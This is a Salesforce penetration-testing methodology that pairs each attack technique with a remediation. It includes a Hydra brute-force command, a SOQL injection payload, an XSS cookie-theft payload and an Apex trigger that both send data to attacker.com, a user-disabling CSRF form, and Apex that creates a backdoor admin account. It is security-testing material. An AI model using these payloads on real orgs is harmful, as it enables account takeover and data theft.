___
## Table of Contents

1. [Engagement Preparation & Scoping](#engagement-preparation--scoping)
2. [Reconnaissance & Environment Mapping](#reconnaissance--environment-mapping)
3. [Authentication & Identity Testing](#authentication--identity-testing)
4. [Authorization & Access Control Testing](#authorization--access-control-testing)
5. [Data Exposure & Exfiltration Testing](#data-exposure--exfiltration-testing)
6. [Custom Code & Business Logic Testing](#custom-code--business-logic-testing)
7. [Platform Configuration & Misconfiguration Testing](#platform-configuration--misconfiguration-testing)
8. [API & Integration Security Testing](#api--integration-security-testing)
9. [Client-Side & Web Vulnerabilities Testing](#client-side--web-vulnerabilities-testing)
10. [Advanced Exploitation & Privilege Escalation](#advanced-exploitation--privilege-escalation)
11. [Persistence & Defense Evasion](#persistence--defense-evasion)
12. [Reporting & Remediation Framework](#reporting--remediation-framework)
13. [Tools & References](#tools--references)

---

## Engagement Preparation & Scoping

### Objective
Define the scope, gather initial intelligence, and establish access for testing to ensure ethical boundaries and maximize test coverage.

### Steps
- **Confirm Salesforce Edition & Clouds:** Identify the edition (e.g., Enterprise, Unlimited) and clouds in use (e.g., Sales Cloud, Marketing Cloud) to understand feature sets and limitations.
- **Request Test Accounts:** Obtain multiple accounts with varying privilege levels (e.g., System Admin, Standard User, Guest User) to test permissions comprehensively.
- **Identify Testing Constraints:** Define limitations (e.g., no destructive testing, avoid production data) to align with RoE.
- **Obtain API Access:** Secure OAuth credentials or API tokens for automated testing and enumeration.

### Tools
- Salesforce CLI (`sfdx`)
- `simple_salesforce` (Python library)
- Postman (API exploration)

### Impact
Proper scoping ensures ethical testing and prevents legal or service disruptions while maximizing coverage of attack surfaces.

---

## Reconnaissance & Environment Mapping

### 2.1 Org Metadata Enumeration
**Description:** Gather critical metadata about the Salesforce org (Org ID, Instance, Edition) to identify potential attack vectors.  
**Root Cause:** Publicly accessible metadata or insufficient API restrictions may expose org details.  
**Enumeration Techniques:**
- **UI Navigation:** Login as an admin or highest privilege account, navigate to `Setup > Company Settings > Company Information` to obtain Org ID, Instance (e.g., NA52), and Edition.
- **Salesforce CLI:** Extract metadata for analysis.
  ```bash
  sfdx force:auth:web:login -a targetOrg
  sfdx force:mdapi:retrieve -r ./metadata -u targetOrg
  ```
- **Apex Query (Developer Console):** If accessible, run the following to query org details.
  ```apex
  Organization org = [SELECT Id, Name, InstanceName, OrganizationType FROM Organization LIMIT 1];
  System.debug('Org Details: ' + org);
  ```
**Impact:** Reveals edition-specific features (e.g., Unlimited Edition allows more custom code) and instance details for targeted attacks.  
**Remediation:** Restrict metadata access to admin roles only; monitor API calls for unusual metadata queries.

### 2.2 User & Role Enumeration
**Description:** Identify users, roles, and profiles to target high-privilege accounts for attacks.  
**Root Cause:** Lack of restrictions on user enumeration via UI or API.  
**Enumeration Techniques:**
- **UI Navigation:** Navigate to `Setup > Users > Users` to list active users, noting profiles and roles.
- **SOQL Query (Developer Console):**
  ```sql
  SELECT Id, Username, Email, FirstName, LastName, Profile.Name, UserRole.Name, IsActive 
  FROM User 
  WHERE IsActive = TRUE 
  ORDER BY Profile.Name 
  LIMIT 200
  ```
- **REST API Enumeration (if API access available):**
  ```bash
  curl -H "Authorization: Bearer <YOUR_ACCESS_TOKEN>" \
       "https://<INSTANCE>.salesforce.com/services/data/v56.0/query?q=SELECT+Id,Username,Email+FROM+User+WHERE+IsActive=TRUE" \
       -o users.json
  ```
**Impact:** Enables social engineering, phishing, or brute-force attacks on admin accounts.  
**Remediation:** Restrict user list visibility to admins; enforce MFA; apply IP allowlisting for admin logins.

### 2.3 Custom Code Footprint Mapping
**Description:** Identify custom-developed Apex, Visualforce, and Lightning Web Components (LWC) as primary attack surfaces.  
**Root Cause:** In-house or contractor-developed code often lacks secure coding practices, introducing logic flaws.  
**Enumeration Techniques:**
- **UI Navigation:** Navigate to `Setup > Custom Code` to list Apex Classes, Triggers, Visualforce Pages, and Lightning Components. Focus on components with no `NamespacePrefix` (indicates custom, not managed package).
- **SOQL Query (Developer Console):**
  ```sql
  SELECT Name, ApiVersion, NamespacePrefix FROM ApexClass WHERE ApiVersion < 45.0
  ```
  (Older API versions have weaker security defaults.)
- **Static Analysis Tools:** Use PMD or Checkmarx to grep for risky keywords like `Database.query(`, `without sharing`, or `escape="false"`.
**Impact:** Defines custom attack surfaces for vulnerabilities like SOQL injection or XSS.  
**Remediation:** Implement a secure SDLC; mandate SAST scanning in CI/CD pipelines; enforce API version upgrades.

---

## Authentication & Identity Testing

### 3.1 Password Policy Bypass
**Description:** Weak password policies (e.g., short length, no complexity) enable brute-force or credential stuffing attacks.  
**Root Cause:** Lack of strong password requirements or lockout mechanisms.  
**Enumeration Techniques:**
- **UI Navigation:** Check `Setup > Security > Password Policies` for minimum length, complexity, history, and lockout settings.
- **SOQL Query (Developer Console):**
  ```sql
  SELECT MinimumPasswordLength, PasswordComplexity, PasswordHistory, LockoutInterval FROM Organization
  ```
- **Exploitation Steps:**
  1. Enumerate policy parameters from UI or SOQL.
  2. Use tools like Burp Suite Intruder or Hydra for brute-force attacks on `https://login.salesforce.com/`.
     ```bash
     hydra -l <targetuser> -P wordlist.txt https://login.salesforce.com/ -s 443 http-post-form "/?un=^USER^&pw=^PASS^&Login=Login:incorrect"
     ```
**Impact:** Account compromise via brute-force or stolen credentials.  
**Remediation:** Enforce 12+ character passwords with mixed case, numbers, and symbols; set lockout after 5 failed attempts; rotate passwords every 90 days.

### 3.2 Multi-Factor Authentication (MFA) Gaps
**Description:** Lack of MFA or inconsistent enforcement exposes high-privilege accounts to compromise.  
**Root Cause:** MFA not enforced for all users, especially admins or API users.  
**Enumeration Techniques:**
- **SOQL Query (Developer Console):**
  ```sql
  SELECT Id, Username, UserPreferencesMfaRequired FROM User WHERE IsActive = TRUE
  ```
- **UI Navigation:** Check `Setup > Security > Multi-Factor Authentication` for policies.
- **Exploitation Steps:**
  1. Identify users without `UserPreferencesMfaRequired = TRUE`.
  2. Target these accounts for credential reuse or brute-force attacks using methods from 3.1.
**Impact:** Account takeover without secondary authentication barriers.  
**Remediation:** Enforce MFA for all users, especially admins and integration accounts; use session security levels to require MFA for sensitive operations.

### 3.3 Session Management Exploits
**Description:** Weak session controls (e.g., long timeouts, no IP restrictions) enable session hijacking.  
**Root Cause:** Insufficient session security settings or lack of HttpOnly/Secure flags.  
**Enumeration Techniques:**
- **UI Navigation:** Review `Setup > Session Settings` for timeout, IP enforcement, and session locking policies.
- **Exploitation Steps:**
  1. Steal a session cookie (`sid`) from a victim’s browser (via XSS or phishing).
  2. Replay the session using a tool like cURL:
     ```bash
     curl -H "Cookie: sid=<SESSIONID>" https://<INSTANCE>.my.salesforce.com/home/home.jsp
     ```
  3. Test if the session remains valid from different IPs (indicating lack of IP pinning).
**Impact:** Unauthorized access persistence via hijacked sessions.  
**Remediation:** Enforce IP restrictions on profiles; set aggressive session timeouts (e.g., 2 hours); enable session IP locking and HttpOnly/Secure attributes.

---

## Authorization & Access Control Testing

### 4.1 Over-Privileged Profiles & Permission Sets
**Description:** Profiles or permission sets with excessive permissions (e.g., “View All Data”) allow unauthorized access.  
**Root Cause:** Admins grant broad permissions for convenience, violating least privilege principles.  
**Enumeration Techniques:**
- **UI Navigation:** Check `Setup > Users > Profiles` for system permissions like “View All Data” or “Modify All Data”.
- **SOQL Query (Developer Console):**
  ```sql
  SELECT Id, Label, PermissionsViewAllData, PermissionsModifyAllData 
  FROM PermissionSet 
  WHERE PermissionsViewAllData = TRUE OR PermissionsModifyAllData = TRUE
  ```
  ```sql
  SELECT Assignee.Name, PermissionSet.Label 
  FROM PermissionSetAssignment 
  WHERE PermissionSet.PermissionsViewAllData = TRUE
  ```
- **Exploitation Steps:**
  1. Log in with a test account tied to an over-privileged profile.
  2. Navigate to objects like `Account` or `Opportunity` and verify access to all records beyond user scope.
  3. Attempt to modify or delete records to confirm “Modify All Data” impact.
**Impact:** Unauthorized access to or manipulation of org-wide data.  
**Remediation:** Adhere to least privilege; disable “View All Data” and “Modify All Data” unless essential; audit permission sets regularly.

### 4.2 Sharing Rule Overexposure
**Description:** Overly permissive sharing rules expose data beyond intended users.  
**Root Cause:** Misconfigured manual sharing or Org-Wide Defaults (OWD) set to “Public Read/Write”.  
**Enumeration Techniques:**
- **UI Navigation:** Review `Setup > Security > Sharing Settings` for OWD and sharing rules per object.
- **Exploitation Steps:**
  1. Log in as a low-privilege user (e.g., Standard User).
  2. Navigate to an object with suspected sharing rules (e.g., `Account` tab).
  3. Attempt to view/edit records not owned by the user.
  4. If API access is available, query records:
     ```bash
     curl -H "Authorization: Bearer <YOUR_ACCESS_TOKEN>" \
          "https://<INSTANCE>.salesforce.com/services/data/v56.0/query?q=SELECT+Id,Name+FROM+Account+LIMIT+100" \
          -o accounts.json
     ```
**Impact:** Data leakage or unauthorized modifications.  
**Remediation:** Set OWD to “Private” for sensitive objects; use role hierarchies and manual sharing sparingly; audit sharing rules.

### 4.3 Guest User & Community Exploitation
**Description:** Guest users in Communities or Sites often have unintended access to objects or records.  
**Root Cause:** Overly permissive OWD or sharing rules for guest profiles.  
**Enumeration Techniques:**
- **UI Navigation:** Check `Setup > Sites > [Site Label] > Public Access Settings` for guest profile permissions.
- **SOQL Query (Developer Console):**
  ```sql
  SELECT Id, Name FROM User WHERE Profile.Name LIKE '%Guest%'
  ```
- **Exploitation Steps:**
  1. Access public API endpoints or site URLs (e.g., `https://<siteurl>.force.com/services/data/v58.0/sobjects/`).
  2. Query vulnerable objects like `Case` or `Contact`:
     ```bash
     curl "https://<siteurl>.force.com/services/data/v58.0/query?q=SELECT+Id,Name,Email+FROM+Contact"
     ```
  3. Test creation/modification rights:
     ```bash
     curl -X POST "https://<siteurl>.force.com/services/data/v58.0/sobjects/Case" \
          -H "Content-Type: application/json" \
          -d '{"Subject": "Test Case", "Description": "Injected"}'
     ```
**Impact:** Critical data exposure or manipulation by unauthenticated users.  
**Remediation:** Remove CRUD permissions from guest profiles unless required; set OWD to “Private” for sensitive objects; enable “Secure guest user record access” in Sharing Settings.

---

## Data Exposure & Exfiltration Testing

### 5.1 Insecure Record Visibility via API
**Description:** APIs may return records beyond user permissions due to misconfigured sharing settings.  
**Root Cause:** API queries often bypass UI restrictions if sharing isn’t enforced.  
**Enumeration Techniques:**
- **Obtain API Token:** Use a Connected App or user credentials for access.
- **Query Sensitive Objects (REST API):**
  ```bash
  curl -H "Authorization: Bearer <YOUR_ACCESS_TOKEN>" \
       "https://<INSTANCE>.salesforce.com/services/data/v56.0/query?q=SELECT+Id,Name,AnnualRevenue+FROM+Account+LIMIT+100" \
       -o sensitive_data.json
  ```
- **Exploitation Steps:**
  1. Use a low-privilege account’s token to query objects.
  2. If data is returned, escalate by querying other objects or increasing the `LIMIT`.
  3. Automate extraction with Python:
     ```python
     from simple_salesforce import Salesforce
     sf = Salesforce(instance_url='https://<INSTANCE>.salesforce.com', session_id='<YOUR_ACCESS_TOKEN>')
     result = sf.query("SELECT Id, Name FROM Account LIMIT 1000")
     print(result['records'])
     ```
**Impact:** Bulk extraction of sensitive data (e.g., PII, financials).  
**Remediation:** Enforce sharing rules on API access; limit API scopes for Connected Apps; monitor API usage for anomalies.

### 5.2 Exposed Reports & Dashboards
**Description:** Misconfigured reports or dashboards in shared folders leak summarized data.  
**Root Cause:** Public or shared folder access controls are too permissive.  
**Enumeration Techniques:**
- **UI Navigation:** Navigate to `Reports` or `Dashboards` tab, filter by “All Reports/Dashboards”; check folder sharing via `Setup > Report and Dashboard Folder Sharing`.
- **SOQL Query (Developer Console):**
  ```sql
  SELECT Id, Name, FolderName FROM Report WHERE FolderName = 'Public Reports'
  ```
- **Exploitation Steps:**
  1. Log in as a low-privilege user.
  2. Access a report/dashboard in a shared folder.
  3. Export data if possible, or screenshot sensitive aggregations.
**Impact:** Exposure of business-critical data or metrics.  
**Remediation:** Restrict visibility to specific roles; avoid “View All” permissions on folders; audit folder access.

### 5.3 Chatter & Feed Information Leaks
**Description:** Sensitive information (e.g., passwords, PII) may be disclosed in Chatter posts or feeds.  
**Root Cause:** Lack of Data Loss Prevention (DLP) or user training on secure communication.  
**Enumeration Techniques:**
- **SOQL Query (Developer Console):**
  ```sql
  SELECT Body, CreatedById FROM FeedItem WHERE Body LIKE '%password%' OR Body LIKE '%secret%'
  ```
- **UI Navigation:** Browse Chatter posts for sensitive disclosures.
- **Exploitation Steps:**
  1. Use API or UI to read Chatter posts.
  2. Search for secrets, tokens, or PII in post content.
**Impact:** Accidental exposure of credentials or sensitive data.  
**Remediation:** Implement DLP processes for Chatter; train users on data posting policies; review posts periodically.

---

## Custom Code & Business Logic Testing

### 6.1 SOQL Injection in Apex
**Description:** Dynamic SOQL queries with unsanitized user input allow query manipulation.  
**Root Cause:** String concatenation in SOQL queries instead of using bind variables.  
**Enumeration Techniques:**
- **UI Navigation:** Review `Setup > Custom Code > Apex Classes` for dynamic SOQL:
  ```apex
  // Vulnerable Code
  public void searchAccounts(String searchTerm) {
      String query = 'SELECT Id, Name FROM Account WHERE Name LIKE \'%' + searchTerm + '%\'';
      List<Account> results = Database.query(query);
      // Process results
  }
  ```
- **Static Analysis:** Use PMD or Checkmarx to identify dynamic queries.
- **Exploitation Steps:**
  1. Identify user inputs feeding into dynamic SOQL (e.g., Visualforce page or Lightning component).
  2. Inject a payload to manipulate the query:
     - Input: `test%' OR '1'='1`
     - Resulting Query: `SELECT Id, Name FROM Account WHERE Name LIKE '%test%' OR '1'='1%'`
     - Effect: Returns all records.
  3. Deploy a test Visualforce page to trigger:
     ```html
     <apex:page controller="VulnerableController">
         <apex:form>
             <apex:inputText value="{!searchTerm}" />
             <apex:commandButton action="{!searchAccounts}" value="Search" />
         </apex:form>
     </apex:page>
     ```
**Impact:** Full data extraction or access control bypass.  
**Remediation:** Use bind variables:
  ```apex
  String searchTerm = '%' + userInput + '%';
  List<Account> results = [SELECT Id, Name FROM Account WHERE Name LIKE :searchTerm];
  ```
  Conduct regular code reviews and enforce static analysis.

### 6.2 Insecure Direct Object Reference (IDOR) in Visualforce
**Description:** Manipulating record IDs in URLs or parameters allows unauthorized data access.  
**Root Cause:** Lack of server-side access checks on record IDs.  
**Enumeration Techniques:**
- **UI Navigation:** Identify Visualforce pages or Lightning components accepting record IDs (e.g., `?id=001xxxxxxxxxxxx`).
- **Code Review (Developer Console):**
  ```apex
  // Vulnerable Code
  public Account getAccount() {
      String recordId = ApexPages.currentPage().getParameters().get('id');
      return [SELECT Id, Name, AnnualRevenue FROM Account WHERE Id = :recordId];
  }
  ```
- **Exploitation Steps:**
  1. Access a Visualforce page with a record ID parameter (e.g., `https://<INSTANCE>.visual.force.com/apex/MyPage?id=001xxxxxxxxxxxx`).
  2. Modify the `id` parameter to another record ID (e.g., increment or use a known ID).
  3. Confirm if unauthorized data is displayed.
**Impact:** Unauthorized access to sensitive records.  
**Remediation:** Implement server-side checks:
  ```apex
  public Account getAccount() {
      String recordId = ApexPages.currentPage().getParameters().get('id');
      Account acc = [SELECT Id, Name FROM Account WHERE Id = :recordId];
      if (!Schema.sObjectType.Account.isAccessible()) {
          throw new AuraHandledException('Access Denied');
      }
      return acc;
  }
  ```

### 6.3 Insecure Apex Execution Context (CRUD/FLS Bypass)
**Description:** Apex classes running in system context bypass sharing rules and Field-Level Security (FLS) unless explicitly enforced.  
**Root Cause:** Developers assume platform security or use `without sharing` for functionality.  
**Enumeration Techniques:**
- **Static Analysis (Code Review):** Search for `without sharing` or missing `WITH SECURITY_ENFORCED` in SOQL.
  ```apex
  // Vulnerable Code
  public with sharing class CaseController {
      @AuraEnabled
      public static void saveCaseDetails(Id caseId, String accountNameToUpdate) {
          Case c = [SELECT Id, AccountId FROM Case WHERE Id = :caseId];
          Account a = new Account(Id = c.AccountId, Name = accountNameToUpdate);
          update a; // System context bypasses user permissions on Account!
      }
  }
  ```
- **Dynamic Analysis (Burp Suite):**
  1. Capture a legitimate request to the `@AuraEnabled` method via `/aura` endpoint.
  2. Modify parameters (e.g., `accountNameToUpdate`) in Burp Repeater to test unauthorized writes.
  3. Verify if the update succeeds despite lacking direct edit permissions.
**Impact:** Critical privilege escalation to read/write restricted data.  
**Remediation:** Use `WITH SECURITY_ENFORCED` for SOQL:
  ```apex
  List<Account> accs = [SELECT Id FROM Account WITH SECURITY_ENFORCED];
  ```
  For DML, manually check permissions or use `Security.stripInaccessible()` to remove inaccessible fields.

---

## Platform Configuration & Misconfiguration Testing

### 7.1 Default Sharing on Custom Objects
**Description:** Custom objects with loose sharing defaults expose data unintentionally.  
**Root Cause:** Developers or admins set sharing to `ReadWrite` or fail to configure OWD.  
**Enumeration Techniques:**
- **SOQL Query (Developer Console):**
  ```sql
  SELECT DeveloperName, SharingModel FROM CustomObject WHERE SharingModel = 'ReadWrite'
  ```
- **UI Navigation:** Check `Setup > Object Manager > [Custom Object] > Sharing Settings`.
- **Exploitation Steps:**
  1. Log in as a low-privilege user.
  2. Access the custom object via UI or API to view/edit records not owned by the user.
**Impact:** Accidental data exposure across users.  
**Remediation:** Set sharing to `Private` by default for custom objects; apply specific sharing rules as needed.

### 7.2 Debug Log Exposure
**Description:** Overly verbose debug logs may leak sensitive data like credentials or session tokens.  
**Root Cause:** Debug logs set to high verbosity without filtering sensitive information.  
**Enumeration Techniques:**
- **UI Navigation:** Check `Setup > Debug Logs` for logs on privileged actions or users.
- **Exploitation Steps:**
  1. If accessible, review logs for sensitive data (e.g., API tokens, passwords).
  2. Trigger debug logging via custom code or actions to capture data.
**Impact:** Exposure of secrets or internal logic for further attacks.  
**Remediation:** Minimize debug logging in production; mask sensitive fields in logs; restrict log access to admins.

---

## API & Integration Security Testing

### 8.1 Over-Scoped Connected Apps
**Description:** Connected Apps with excessive OAuth scopes (e.g., `full` or `api`) allow unintended data access.  
**Root Cause:** Apps request broad scopes beyond minimal requirements.  
**Enumeration Techniques:**
- **UI Navigation:** Review `Setup > Apps > Connected Apps` for app scopes.
- **Exploitation Steps:**
  1. If authorized, log in to the Connected App or steal an OAuth token via phishing.
  2. Use the token to query sensitive data:
     ```bash
     curl -H "Authorization: Bearer <STOLEN_TOKEN>" \
          "https://<INSTANCE>.salesforce.com/services/data/v56.0/query?q=SELECT+Id,Name+FROM+Account+LIMIT+1000" \
          -o stolen_data.json
     ```
**Impact:** Unauthorized data access or manipulation via API.  
**Remediation:** Limit Connected App scopes to minimal required access; enforce admin approval for app installations; monitor OAuth token usage.

### 8.2 Excessive API Permissions
**Description:** Standard or integration users with API access (`ApiEnabled`) can extract data programmatically.  
**Root Cause:** Profiles unnecessarily granted API permissions.  
**Enumeration Techniques:**
- **SOQL Query (Developer Console):**
  ```sql
  SELECT Name, PermissionsApiEnabled FROM Profile WHERE PermissionsApiEnabled = TRUE
  ```
- **Exploitation Steps:**
  1. Use valid credentials to access REST/SOAP APIs:
     ```bash
     curl -H "Authorization: Bearer <ACCESS_TOKEN>" \
          "https://<INSTANCE>.salesforce.com/services/data/v58.0/sobjects/"
     ```
  2. Enumerate all accessible objects and extract data.
**Impact:** Mass data exfiltration or lateral movement.  
**Remediation:** Restrict API access to specific profiles; use managed packages or named credentials for integrations.

---

## Client-Side & Web Vulnerabilities Testing

### 9.1 Lightning Web Component (LWC) DOM-Based XSS
**Description:** Unsanitized user input in LWCs can lead to JavaScript injection and code execution.  
**Root Cause:** Use of `innerHTML` or similar DOM manipulation methods without sanitization.  
**Enumeration Techniques:**
- **UI Navigation:** Check `Setup > Custom Code > Lightning Components` for custom LWCs.
- **Code Review (Developer Console):**
  ```javascript
  // Vulnerable LWC
  import { LightningElement, api } from 'lwc';
  export default class VulnerableComponent extends LightningElement {
      @api userInput;
      renderedCallback() {
          this.template.querySelector('div').innerHTML = this.userInput; // XSS risk
      }
  }
  ```
- **Exploitation Steps:**
  1. Pass a malicious payload via URL or form input:
     - Payload: `<script>alert('XSS')</script>`
  2. Confirm if the payload executes in the browser.
  3. Escalate to steal session cookies:
     - Payload: `<script>document.location='https://attacker.com/steal?cookie='+document.cookie</script>`
**Impact:** Session hijacking, data theft, or malicious actions.  
**Remediation:** Avoid `innerHTML`; use safe DOM APIs:
  ```javascript
  this.template.querySelector('div').textContent = this.userInput; // Safer
  ```

### 9.2 CSRF & Clickjacking
**Description:** Lack of CSRF tokens or anti-frame headers allows cross-origin manipulation or UI trickery.  
**Root Cause:** Missing protections in custom endpoints or platform pages.  
**Enumeration Techniques:**
- **Check Headers:** Use browser dev tools to inspect response headers for `X-Frame-Options` or `Content-Security-Policy`.
- **Exploitation Steps:**
  1. Attempt to embed sensitive pages in an iframe to test clickjacking.
  2. Craft a CSRF payload for a custom endpoint without tokens:
     ```html
     <form action="https://<INSTANCE>.salesforce.com/setup/own/users.jsp" method="POST">
         <input type="hidden" name="save" value="1">
         <input type="hidden" name="id" value="005xxxxxxxxxxxx">
         <input type="hidden" name="IsActive" value="false">
         <input type="submit" value="Disable User Account">
     </form>
     ```
**Impact:** Social engineering or unauthorized actions on behalf of users.  
**Remediation:** Ensure anti-clickjacking headers are sent; validate CSRF tokens on custom endpoints.

---

## Advanced Exploitation & Privilege Escalation

### 10.1 Flow Builder Privilege Escalation
**Description:** Misconfigured Flows running in system context allow privilege escalation.  
**Root Cause:** Flows ignore user permissions if not explicitly restricted.  
**Enumeration Techniques:**
- **UI Navigation:** Check `Setup > Process Automation > Flows` for user-input-driven Flows updating sensitive objects.
- **Exploitation Steps:**
  1. Trigger a Flow as a low-privilege user (e.g., via custom button or Visualforce page).
  2. Provide inputs to update a record (e.g., change ownership or field values).
  3. Confirm if unauthorized updates occur.
**Impact:** Data tampering or privilege escalation.  
**Remediation:** Run Flows in user context; validate inputs and permissions within Flows; limit access to specific profiles.

### 10.2 System Context Abuse via Apex Triggers
**Description:** Apex triggers running in system context can be abused to perform privileged actions.  
**Root Cause:** Triggers execute with elevated privileges unless restricted.  
**Enumeration Techniques:**
- **Code Review (Developer Console):** Review triggers in `Setup > Custom Code > Apex Triggers` for updates or callouts.
- **Exploitation Steps:**
  1. Identify a trigger on a writable object (e.g., Case update).
  2. Manipulate input to influence trigger behavior (e.g., update a related Account).
  3. Confirm if unauthorized actions occur.
**Impact:** Bypassing sharing rules or FLS for data manipulation.  
**Remediation:** Explicitly check permissions in triggers; avoid system context unless necessary.

---

## Persistence & Defense Evasion

### 11.1 Backdoor via Malicious Apex
**Description:** Deploying malicious Apex code provides persistent access or backdoors.  
**Root Cause:** Users with `Customize Application` or `Author Apex` can deploy code.  
**Enumeration Techniques:**
- **SOQL Query (Developer Console):**
  ```sql
  SELECT Name, NamespacePrefix FROM ApexClass WHERE Name LIKE '%admin%' OR Name LIKE '%backdoor%'
  ```
- **Exploitation Steps:**
  1. If code deployment is in scope, deploy a malicious class to create a backdoor admin user:
     ```apex
     public class AddAdmin {
         public static void escalatePrivs() {
             Profile p = [SELECT Id FROM Profile WHERE Name='System Administrator'];
             User u = new User(
                 Alias = 'pwned',
                 Email='attacker@example.com',
                 EmailEncodingKey='UTF-8',
                 LastName='Admin',
                 LanguageLocaleKey='en_US',
                 LocaleSidKey='en_US',
                 ProfileId = p.Id,
                 TimeZoneSidKey='America/Los_Angeles',
                 UserName='pwned_user@example.com.test'
             );
             insert u;
         }
     }
     ```
  2. Execute via Developer Console: `AddAdmin.escalatePrivs();`.
**Impact:** Persistent admin access for long-term compromise.  
**Remediation:** Restrict code deployment to trusted admins; enforce code reviews; monitor Apex changes via audit logs.

### 11.2 Data Exfiltration via Unmonitored Channels
**Description:** Use legitimate Salesforce features to exfiltrate data covertly.  
**Root Cause:** Lack of monitoring on outbound channels like email or callouts.  
**Exploitation Steps:**
  1. Modify an Apex trigger to send data to an attacker server via HTTP callout:
     ```apex
     trigger AccountTrigger on Account (after insert) {
         for (Account a : Trigger.new) {
             HttpRequest req = new HttpRequest();
             req.setEndpoint('https://attacker.com/log');
             req.setMethod('POST');
             req.setBody('Stolen Data: ' + a.Name + ' - Revenue: ' + a.AnnualRevenue);
             new Http().send(req);
         }
     }
     ```
  2. Configure email alerts to send reports to external addresses.
**Impact:** Covert data theft bypassing DLP.  
**Remediation:** Monitor outbound callouts and emails; restrict external communications in Apex code.

---

## Reporting & Remediation Framework

### Objective
Deliver clear, actionable findings to the client with evidence and remediation guidance.

### Steps
- **Document Findings:** For each vulnerability, include:
  - Description, root cause, and business impact.
  - Screenshots, API responses, or logs as proof of concept (PoC).
  - Sample payloads or code used during exploitation.
- **Prioritize Issues:** Use CVSS scores or business impact (e.g., data breach risk) to rank findings.
- **Provide Remediation:** Offer specific fixes as detailed in each section above, tailored to the client’s environment.

### Impact
Ensures the client can address vulnerabilities effectively, reducing risk and improving security posture.

---

## Tools & References

### Tools
- **CLI & Automation:** Salesforce CLI (`sfdx`), `simple_salesforce` (Python), `jsforce` (Node.js)
- **API Testing:** Postman, Burp Suite (intercept OAuth flows), cURL
- **Static Analysis:** PMD, Checkmarx, SonarQube (for Apex and LWC code)
- **Browser Extensions:** Salesforce Inspector (Chrome) for metadata exploration

### References
- Salesforce Security Guide (Salesforce documentation)
- OWASP Top 10 (relevant to web and API vulnerabilities)
- CIS Salesforce Benchmarks (configuration hardening)
- Trailhead Security Modules (official Salesforce training)

---

## Final Thoughts

Salesforce tenants are complex environments with diverse attack surfaces including access controls, custom code, APIs, and integrations. As an elite tester, focus on chaining vulnerabilities (e.g., IDOR to API data exposure) for maximum impact. Salesforce’s robust logging and monitoring can detect malicious activity, so operate strictly within RoE. Break responsibly to secure the cloud.